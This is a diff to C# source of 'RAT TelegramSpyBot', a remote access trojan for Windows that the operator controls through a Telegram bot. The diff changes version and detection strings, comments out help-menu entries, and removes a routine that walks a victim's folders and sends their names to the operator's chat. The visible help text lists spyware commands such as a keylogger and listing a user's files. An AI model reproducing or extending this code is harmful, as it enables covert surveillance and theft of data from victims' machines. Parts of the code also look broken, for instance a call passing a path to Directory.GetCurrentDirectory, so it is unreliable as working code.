@@ -141,8 +141,7 @@ namespace RATTelegramSpyBot {
                     ListarFiles(@"C: \Users\" + UserName);
                     SendBotMessage("Finish Command");
                     break;
-                #endregion
-
+                    #endregion
                 case "/Dir_FolderDisk": // Lista Ruta de discos especificos
                     #region /Dir_FolderDisk
                     var Disk = new InlineKeyboardMarkup(new[]{
@@ -233,11 +232,11 @@ namespace RATTelegramSpyBot {
                         "<b>Developed by:</b> <code>SebastianEPH</code>" +
                         "\n<b>Product Name: </b>" + @"<a href=""https://github.com/SebastianEPH/RAT.TelegramSpyBot"">RAT TelegramSpyBot</a>" + " C#" +
                         "\n<b>Type Software:</b> <code>Remote Administration tool</code>" +
-                        "\n<b>Versión:</b> <code>1.0</code>" +
-                        "\n<b>State:</b> <code>Final</code> [Posibles Fallos]" +
+                        "\n<b>Versión:</b> <code>1.3</code>" +
+                        "\n<b>State:</b> <code>Finish</code>" +
                         "\n<b>Architecture:</b> <code>x86 bits</code> || <code>x64 bits</code>" +
                         "\n<b>Size:</b> <code>400KB aprox</code>" +
-                        "\n<b>Undetectable:</b> <code>Not Tester</code>" +
+                        "\n<b>Undetectable:</b> <code>False</code>" +
                         "\n<b>Plataform:</b> <code>Windows 7, 8.1 and 10</code>" +
                         "\n<b>Programming Lenguage:</b> <code>C# .Net Framework 4.7</code>" +
                         "\n<b>Licence:</b> <code>MIT</code>" +
@@ -273,8 +272,8 @@ namespace RATTelegramSpyBot {
                   "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subcarpetas.
                   "\n/Dir_CurrentUserFiles     <List files of current user>" +  // Lista Archivos dentro de los usuarios actual 
                   "\n/Dir_CurrentUserFolders   <List folders of current user>" +// Lista Carpetas dentro del usuario actual 
-                  "\n/Dir_UserFolders     <Show User Folders>" +                // Muestra carpetas de usuarios en la PC 
-                  "\n/Dir_UserFolder     |Buttons| Only Folder Tree Drive" +    // 
+                  //"\n/Dir_UserFolders     <Show User Folders>" +                // Muestra carpetas de usuarios en la PC 
+                  //"\n/Dir_UserFolder     |Buttons| Only Folder Tree Drive" +    // 
                   "\n/Dir_FolderDisk     |Buttons| Only Folder Tree Drive" +    // Lista Arbol de solo carpetas de Unidades de almacemiento
                   // 
                   "\n/Keylogger           <Get File log >" +                    // Obtiene el registro de teclas por mensaje
@@ -475,24 +474,6 @@ namespace RATTelegramSpyBot {
         }
 
         #region Funciones Complementarias [importantes] 
-        private static async void GetDirectorys(string path, int indent = 0) {
-            try {
-                try {
-                    if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
-                        foreach (string folder in Directory.GetCurrentDirectory(path)) {
-                            //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));
-
-                            await Bot.SendTextMessageAsync(config.ID, folder);
-
-                            GetFoldersAll(folder, indent + 2);
-                        }
-                    }
-                } catch (UnauthorizedAccessException) { }
-
-            } catch {   // Si no encuentra el directorio
-                await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
-            }
-        }
 
         private static async void GetFoldersAll(string path, int indent = 0) {
             try {
